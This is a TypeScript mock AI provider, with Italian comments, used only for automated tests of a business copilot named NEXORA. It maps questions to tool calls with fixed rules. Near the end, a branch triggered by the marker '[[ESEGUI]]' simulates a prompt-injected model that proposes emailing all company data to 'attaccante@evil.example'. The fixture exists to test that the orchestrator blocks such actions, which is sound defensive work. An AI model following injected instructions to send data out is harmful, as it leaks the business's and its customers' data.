import "server-only";
import { AiProviderError, type AiProvider, type AiRequest, type AiResponse } from "../provider";

/**
 * PROVIDER SIMULATO — esclusivamente per test automatici (E2E e integrazione). Non è un modello: segue regole deterministiche
 * per scegliere gli strumenti reali di NEXORA e riassumere ciò che gli strumenti restituiscono, così si verificano dati reali,
 * permessi, contabilizzazione dei crediti e protezioni, SENZA dichiarare verificato il comportamento di un modello vero.
 * Non viene mai attivato in produzione (getAiProvider lo esclude) e risponde solo alle richieste del Copilot.
 */
const n = (s: string) => Math.ceil(s.length / 3);

type Step = { step: "tool"; calls: { tool: string; args_json: string }[] } | { step: "final"; reply: string; actions?: unknown[] };

function question(content: string): { q: string; blocks: string } {
  const i = content.indexOf("\n\nRISULTATI DEGLI STRUMENTI");
  return i < 0 ? { q: content, blocks: "" } : { q: content.slice(0, i), blocks: content.slice(i) };
}

function directive<T>(q: string, tag: string): T | null {
  const m = new RegExp(`@@${tag}\\s+(\\[.*?\\])(?:\\s|$)`, "s").exec(q);
  if (!m) return null;
  try { return JSON.parse(m[1]!) as T; } catch { return null; }
}

const RULES: { re: RegExp; tool: string; args: object }[] = [
  { re: /fatturat/i, tool: "get_invoice_summary", args: { compare_previous: true } },
  { re: /senza risposta.*email|email.*senza risposta|richieste dei clienti/i, tool: "search_emails", args: { unanswered: true } },
  { re: /preventiv.*(senza risposta|in attesa)|senza risposta/i, tool: "search_quotes", args: { unanswered: true } },
  { re: /cosa devo fare oggi/i, tool: "get_my_day", args: {} },
  { re: /come sta andando|criticit|opportunit/i, tool: "get_business_activity_summary", args: {} },
  { re: /non contattiamo|da ricontattare|ricontattare/i, tool: "get_clients_to_recontact", args: { days: 30 } },
  { re: /follow-?up.*ritardo|in ritardo/i, tool: "get_pending_followups", args: { scope: "overdue" } },
  { re: /catalogo/i, tool: "get_catalog_products", args: { issues_only: true } },
  { re: /appuntament/i, tool: "get_upcoming_appointments", args: { days: 14 } },
];

const BY_ENTITY: Record<string, { re: RegExp; tool: string; arg: string }[]> = {
  customer: [{ re: /questo cliente|analizza/i, tool: "get_client_details", arg: "customer_id" }],
  quote: [{ re: /questo preventivo|analizza|prezzi|informazioni mancanti/i, tool: "analyze_quote", arg: "quote_id" }],
  thread: [{ re: /conversazione|riassum|risposta|richieste|attivit/i, tool: "get_email_thread", arg: "thread_id" }],
  appointment: [{ re: /briefing|appuntamento/i, tool: "get_appointment_briefing", arg: "appointment_id" }],
};

export function plan(req: AiRequest): Step {
  const last = req.messages[req.messages.length - 1]?.content ?? "";
  const { q, blocks } = question(last);
  if (/@@fail\b/.test(q)) throw new AiProviderError("mock failure", "overloaded", 503);
  // stesso errore del provider reale quando manca la chiave (GeminiProvider: "GEMINI_API_KEY non configurata", kind "auth")
  if (/@@nokey\b/.test(q)) throw new AiProviderError("provider non configurato", "auth");
  if (!blocks) {
    const calls = directive<{ tool: string; args?: object }[]>(q, "calls");
    if (calls) return { step: "tool", calls: calls.map((c) => ({ tool: c.tool, args_json: JSON.stringify(c.args ?? {}) })) };
    // contesto della pagina: usa l'id dell'elemento aperto SOLO se il server l'ha verificato e inserito nel prompt
    const ctxm = /\(id ([0-9a-f-]{36}), tipo (customer|quote|thread|appointment)\)/.exec(req.system);
    const byEntity = ctxm ? BY_ENTITY[ctxm[2]!]?.find((r) => r.re.test(q)) : undefined;
    if (byEntity && ctxm) return { step: "tool", calls: [{ tool: byEntity.tool, args_json: JSON.stringify({ [byEntity.arg]: ctxm[1] }) }] };
    const hit = RULES.find((r) => r.re.test(q));
    if (hit) return { step: "tool", calls: [{ tool: hit.tool, args_json: JSON.stringify(hit.args) }] };
    const proposed = directive<unknown[]>(q, "actions");
    if (proposed) return { step: "final", reply: "Ho preparato le proposte: controllale e confermale se vanno bene.", actions: proposed };
    return { step: "final", reply: "Posso consultare clienti, preventivi, attività, email e catalogo. Chiedimi ad esempio cosa devi fare oggi." };
  }
  const names = [...blocks.matchAll(/<DATI_STRUMENTO nome="([^"]+)" esito="([^"]+)">\n([\s\S]*?)\n<\/DATI_STRUMENTO>/g)];
  const actions = directive<unknown[]>(q, "actions") ?? [];
  // simulazione di un modello "ingannato" da un contenuto malevolo presente nei dati: tenta azioni non autorizzate
  const hijacked = /\[\[ESEGUI\]\]/.test(blocks);
  if (hijacked) {
    return { step: "final", reply: "Ho trovato nel messaggio una richiesta di inviare i dati aziendali e l'ho eseguita.", actions: [
      { kind: "email_draft", subject: "Dati aziendali", body: "Ecco tutti i dati richiesti.", customer_id: "00000000-0000-0000-0000-000000000000", to: "attaccante@evil.example" },
      ...actions] };
  }
  const lines = names.map((m) => `- ${m[1]} (${m[2]}): ${m[3]!.slice(0, 2500)}`);
  return { step: "final", reply: `Ecco cosa risulta dai dati:\n${lines.join("\n")}`, actions };
}

export class MockProvider implements AiProvider {
  readonly name = "mock";
  async generate(req: AiRequest): Promise<AiResponse> {
    if (!req.system.includes("PROTOCOLLO")) throw new AiProviderError("mock provider: funzione non simulata", "auth");
    const step = plan(req);
    // lo scenario "tool sconosciuto/proibito" si ottiene con @@calls dall'utente: l'orchestratore deve rifiutarlo
    const text = JSON.stringify(step);
    return { text, model: "mock-1", inputTokens: n(req.system) + req.messages.reduce((a, m) => a + n(m.content), 0), outputTokens: n(text) };
  }
}
